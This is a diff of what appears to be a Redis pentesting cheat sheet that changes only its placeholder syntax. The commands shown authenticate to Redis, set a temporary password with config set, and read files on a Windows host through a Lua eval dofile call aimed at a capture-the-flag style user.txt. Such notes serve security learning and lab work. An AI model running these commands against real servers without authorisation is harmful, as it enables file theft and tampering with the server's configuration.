@@ -23,11 +23,11 @@ NOAUTH Authentication required.
 ```
 If so, we need to authenticate to communicate with the redis server.
 ```bash
-> auth <password>
+> auth $PASS
 # or
-> auth default <password>
+> auth default $PASS
 # or
-> auth <username> <password>
+> auth $USER $PASS
 ```
 
 ### <span style="color:#50FA7B">Check Config File</span>
@@ -50,11 +50,11 @@ We can set the password in a redis client.
 
 ```bash
 # Check credentials
-> auth <username> <password>
-> auth default <password>
+> auth $USER $PASS
+> auth default $PASS
 
 # Set a password temporary until the service restarts.
-> config set requirepass <password>
+> config set requirepass $PASS
 
 # Information on the Redis server
 > info
@@ -73,7 +73,7 @@ We can set the password in a redis client.
 
 # Read files and directories using Lua scripts
 > eval "dofile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\user.txt')" 0
-> eval "dofile('C:\\\\Users\\\\<username>\\\\Desktop\\\\user.txt')" 0
+> eval "dofile('C:\\\\Users\\\\$USER\\\\Desktop\\\\user.txt')" 0
 
 # Find all keys
 > keys *
